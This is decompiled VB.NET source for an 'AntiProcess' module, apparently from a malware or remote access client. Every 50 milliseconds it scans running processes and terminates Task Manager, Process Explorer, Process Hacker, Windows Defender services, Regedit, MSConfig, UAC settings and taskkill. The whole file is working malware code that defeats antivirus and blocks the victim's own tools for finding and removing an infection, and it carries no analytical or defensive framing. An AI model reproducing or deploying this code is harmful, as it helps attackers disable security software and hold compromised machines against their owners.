Imports System
Imports System.Runtime.InteropServices
Imports System.Security.Permissions
Imports System.Threading

Namespace Client.Helper
	' Token: 0x0200000A RID: 10
	Public Module AntiProcess
		' Token: 0x1700000C RID: 12
		' (get) Token: 0x06000037 RID: 55 RVA: 0x000021EA File Offset: 0x000003EA
		' (set) Token: 0x06000038 RID: 56 RVA: 0x000021F1 File Offset: 0x000003F1
		Public Property Enabled As Boolean

		' Token: 0x06000039 RID: 57 RVA: 0x000021F9 File Offset: 0x000003F9
		Public Sub StartBlock()
			AntiProcess.Enabled = True
			AntiProcess.BlockThread.Start()
		End Sub

		' Token: 0x0600003A RID: 58 RVA: 0x000039E0 File Offset: 0x00001BE0
		<SecurityPermission(SecurityAction.Demand, ControlThread := True)>
		Public Sub StopBlock()
			AntiProcess.Enabled = False
			Try
				AntiProcess.BlockThread.Abort()
				AntiProcess.BlockThread = AddressOf AntiProcess.Block
			Catch
			End Try
		End Sub

		' Token: 0x0600003B RID: 59 RVA: 0x00003A30 File Offset: 0x00001C30
		Private Sub Block()
			While AntiProcess.Enabled
				Dim intPtr As IntPtr = AntiProcess.CreateToolhelp32Snapshot(2UI, 0UI)
				Dim processentry As PROCESSENTRY32 = Nothing
				processentry.dwSize = CUInt(Marshal.SizeOf(GetType(PROCESSENTRY32)))
				If AntiProcess.Process32First(intPtr, processentry) Then
					Do
						Dim th32ProcessID As UInteger = processentry.th32ProcessID
						Dim szExeFile As String = processentry.szExeFile
						If AntiProcess.Matches(szExeFile, "Taskmgr.exe") OrElse AntiProcess.Matches(szExeFile, "ProcessHacker.exe") OrElse AntiProcess.Matches(szExeFile, "procexp.exe") OrElse AntiProcess.Matches(szExeFile, "MSASCui.exe") OrElse AntiProcess.Matches(szExeFile, "MsMpEng.exe") OrElse AntiProcess.Matches(szExeFile, "MpUXSrv.exe") OrElse AntiProcess.Matches(szExeFile, "MpCmdRun.exe") OrElse AntiProcess.Matches(szExeFile, "NisSrv.exe") OrElse AntiProcess.Matches(szExeFile, "ConfigSecurityPolicy.exe") OrElse AntiProcess.Matches(szExeFile, "MSConfig.exe") OrElse AntiProcess.Matches(szExeFile, "Regedit.exe") OrElse AntiProcess.Matches(szExeFile, "UserAccountControlSettings.exe") OrElse AntiProcess.Matches(szExeFile, "taskkill.exe") Then
							AntiProcess.KillProcess(th32ProcessID)
						End If
					Loop While AntiProcess.Process32Next(intPtr, processentry)
				End If
				AntiProcess.CloseHandle(intPtr)
				Thread.Sleep(50)
			End While
		End Sub

		' Token: 0x0600003C RID: 60 RVA: 0x0000220B File Offset: 0x0000040B
		Private Function Matches(source As String, target As String) As Boolean
			Return source.EndsWith(target, StringComparison.InvariantCultureIgnoreCase)
		End Function

		' Token: 0x0600003D RID: 61 RVA: 0x00002215 File Offset: 0x00000415
		Private Sub KillProcess(processId As UInteger)
			Dim intPtr As IntPtr = AntiProcess.OpenProcess(1UI, False, processId)
			AntiProcess.TerminateProcess(intPtr, 0)
			AntiProcess.CloseHandle(intPtr)
		End Sub

		' Token: 0x0600003E RID: 62
		Private Declare Function CreateToolhelp32Snapshot Lib "kernel32.dll" (dwFlags As UInteger, th32ProcessID As UInteger) As IntPtr

		' Token: 0x0600003F RID: 63
		Private Declare Function Process32First Lib "kernel32.dll" (hSnapshot As IntPtr, ByRef lppe As PROCESSENTRY32) As Boolean

		' Token: 0x06000040 RID: 64
		Private Declare Function Process32Next Lib "kernel32.dll" (hSnapshot As IntPtr, ByRef lppe As PROCESSENTRY32) As Boolean

		' Token: 0x06000041 RID: 65
		Private Declare Function OpenProcess Lib "kernel32.dll" (dwDesiredAccess As UInteger, bInheritHandle As Boolean, dwProcessId As UInteger) As IntPtr

		' Token: 0x06000042 RID: 66
		Private Declare Function CloseHandle Lib "kernel32.dll" (handle As IntPtr) As Boolean

		' Token: 0x06000043 RID: 67
		Private Declare Function TerminateProcess Lib "kernel32.dll" (dwProcessHandle As IntPtr, exitCode As Integer) As Boolean

		' Token: 0x04000022 RID: 34
		Private BlockThread As Thread = AddressOf AntiProcess.Block
	End Module
End Namespace
